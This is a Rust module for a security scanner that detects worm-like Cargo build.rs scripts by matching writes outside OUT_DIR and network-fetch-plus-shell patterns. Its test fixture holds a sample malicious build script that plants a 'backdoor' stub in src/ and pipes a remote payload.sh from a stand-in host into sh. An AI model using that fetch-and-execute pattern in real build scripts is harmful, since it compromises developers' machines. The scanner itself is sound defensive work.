//! Cargo `build.rs` worm detector.
//!
//! Cargo build scripts execute before compilation with the developer's local
//! filesystem and network privileges. This module extracts bounded build-script
//! capsules and emits when a script writes outside `OUT_DIR` or combines remote
//! payload retrieval with arbitrary command execution.

use common::slop::StructuredFinding;
use tree_sitter::Parser;

const MAX_BUILD_RS_BYTES: usize = 512 * 1024;

/// Bounded summary of high-risk behavior found in a Cargo build script.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct BuildScriptCapsule {
    /// Build script label or path.
    pub label: String,
    /// Filesystem writes that do not target Cargo's `OUT_DIR`.
    pub outside_out_dir_writes: Vec<String>,
    /// Remote payload URLs or network fetch primitives.
    pub remote_payloads: Vec<String>,
    /// Shell or process execution primitives.
    pub shell_execs: Vec<String>,
}

/// Extract a deterministic capability capsule from a `build.rs` source file.
pub fn extract_build_script_capsules(label: &str, source: &[u8]) -> Vec<BuildScriptCapsule> {
    if !label.ends_with("build.rs") || source.len() > MAX_BUILD_RS_BYTES {
        return Vec::new();
    }
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_rust::LANGUAGE.into())
        .is_err()
    {
        return Vec::new();
    }
    let Some(tree) = parser.parse(source, None) else {
        return Vec::new();
    };
    if tree.root_node().has_error() {
        return Vec::new();
    }

    let text = String::from_utf8_lossy(source);
    let capsule = BuildScriptCapsule {
        label: label.to_string(),
        outside_out_dir_writes: collect_outside_writes(&text),
        remote_payloads: collect_remote_payloads(&text),
        shell_execs: collect_shell_execs(&text),
    };
    if capsule.outside_out_dir_writes.is_empty()
        && capsule.remote_payloads.is_empty()
        && capsule.shell_execs.is_empty()
    {
        Vec::new()
    } else {
        vec![capsule]
    }
}

/// Emit `security:cargo_build_worm` findings for malicious build-script capsules.
pub fn find_cargo_build_worm_slop(label: &str, source: &[u8]) -> Vec<StructuredFinding> {
    extract_build_script_capsules(label, source)
        .into_iter()
        .filter(|capsule| {
            !capsule.outside_out_dir_writes.is_empty()
                || (!capsule.remote_payloads.is_empty() && !capsule.shell_execs.is_empty())
        })
        .map(|capsule| build_finding(source, &capsule))
        .collect()
}

fn collect_outside_writes(text: &str) -> Vec<String> {
    let mut writes = Vec::new();
    for marker in [
        "fs::write",
        "std::fs::write",
        "File::create",
        "std::fs::File::create",
        "OpenOptions::new",
    ] {
        let mut search_from = 0;
        while let Some(pos) = text[search_from..].find(marker) {
            let absolute = search_from + pos;
            let window = bounded_window(text, absolute, 256);
            if targets_outside_out_dir(window) {
                writes.push(format!("{}:{}", marker, path_hint(window)));
            }
            search_from = absolute + marker.len();
        }
    }
    writes.sort();
    writes.dedup();
    writes
}

fn collect_remote_payloads(text: &str) -> Vec<String> {
    let mut payloads = Vec::new();
    for marker in [
        "http://",
        "https://",
        "reqwest::",
        "ureq::",
        "curl ",
        "wget ",
        "git clone",
    ] {
        let lower = text.to_ascii_lowercase();
        let mut search_from = 0;
        while let Some(pos) = lower[search_from..].find(marker) {
            let absolute = search_from + pos;
            payloads.push(path_hint(bounded_window(text, absolute, 192)));
            search_from = absolute + marker.len();
        }
    }
    payloads.sort();
    payloads.dedup();
    payloads
}

fn collect_shell_execs(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut execs = Vec::new();
    for marker in [
        "command::new",
        "std::process::command",
        ".arg(\"-c\")",
        ".arg(\"/c\")",
        "sh\"",
        "bash\"",
        "powershell\"",
        "cmd\"",
    ] {
        let mut search_from = 0;
        while let Some(pos) = lower[search_from..].find(marker) {
            let absolute = search_from + pos;
            execs.push(path_hint(bounded_window(text, absolute, 192)));
            search_from = absolute + marker.len();
        }
    }
    execs.sort();
    execs.dedup();
    execs
}

fn targets_outside_out_dir(window: &str) -> bool {
    let lower = window.to_ascii_lowercase();
    let writes_to_out_dir = lower.contains("out_dir") || lower.contains("env::var(\"out_dir\")");
    if writes_to_out_dir {
        return false;
    }
    [
        "\"src/", "\".git/", "\"../", "\"~/.ssh", "\"/tmp/", "\"/etc/", "home_dir", ".ssh",
    ]
    .iter()
    .any(|marker| lower.contains(marker))
}

fn bounded_window(text: &str, start: usize, len: usize) -> &str {
    let mut end = (start + len).min(text.len());
    while end > start && !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[start..end]
}

fn path_hint(window: &str) -> String {
    window
        .lines()
        .next()
        .unwrap_or("")
        .chars()
        .take(160)
        .collect()
}

fn build_finding(source: &[u8], capsule: &BuildScriptCapsule) -> StructuredFinding {
    let line = first_evidence_line(source, capsule);
    let material = format!(
        "security:cargo_build_worm:{}:{:?}:{:?}:{:?}",
        capsule.label, capsule.outside_out_dir_writes, capsule.remote_payloads, capsule.shell_execs
    );
    StructuredFinding {
        id: "security:cargo_build_worm".to_string(),
        file: Some(capsule.label.clone()),
        line: Some(line),
        fingerprint: short_fingerprint(material.as_bytes()),
        severity: Some("KevCritical".to_string()),
        remediation: Some(
            "Confine build-script writes to OUT_DIR and remove network-to-shell execution from Cargo build phase."
                .to_string(),
        ),
        upstream_validation_absent: true,
        ..Default::default()
    }
}

fn first_evidence_line(source: &[u8], capsule: &BuildScriptCapsule) -> u32 {
    let text = String::from_utf8_lossy(source);
    let evidence = capsule
        .outside_out_dir_writes
        .first()
        .or_else(|| capsule.shell_execs.first())
        .or_else(|| capsule.remote_payloads.first());
    if let Some(marker) = evidence {
        let needle = marker
            .split(':')
            .next()
            .filter(|part| !part.is_empty())
            .unwrap_or(marker);
        if let Some(pos) = text.find(needle) {
            return byte_to_line(source, pos);
        }
    }
    1
}

fn byte_to_line(source: &[u8], byte: usize) -> u32 {
    source[..source.len().min(byte)]
        .iter()
        .filter(|&&b| b == b'\n')
        .count() as u32
        + 1
}

fn short_fingerprint(bytes: &[u8]) -> String {
    let digest = blake3::hash(bytes);
    digest.as_bytes()[..8]
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_rs_worm_writing_src_and_remote_shell_is_detected() {
        let source = br#"
use std::process::Command;

fn main() {
    std::fs::write("src/generated.rs", "pub fn backdoor() {}").unwrap();
    Command::new("sh")
        .arg("-c")
        .arg("curl https://example.invalid/payload.sh | sh")
        .status()
        .unwrap();
}
"#;

        let findings = find_cargo_build_worm_slop("build.rs", source);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].id, "security:cargo_build_worm");
        assert_eq!(findings[0].severity.as_deref(), Some("KevCritical"));
    }

    #[test]
    fn build_rs_out_dir_write_is_clean() {
        let source = br#"
use std::{env, fs, path::Path};

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    fs::write(Path::new(&out_dir).join("bindings.rs"), "pub const OK: u8 = 1;").unwrap();
}
"#;

        let findings = find_cargo_build_worm_slop("build.rs", source);

        assert!(findings.is_empty());
    }
}
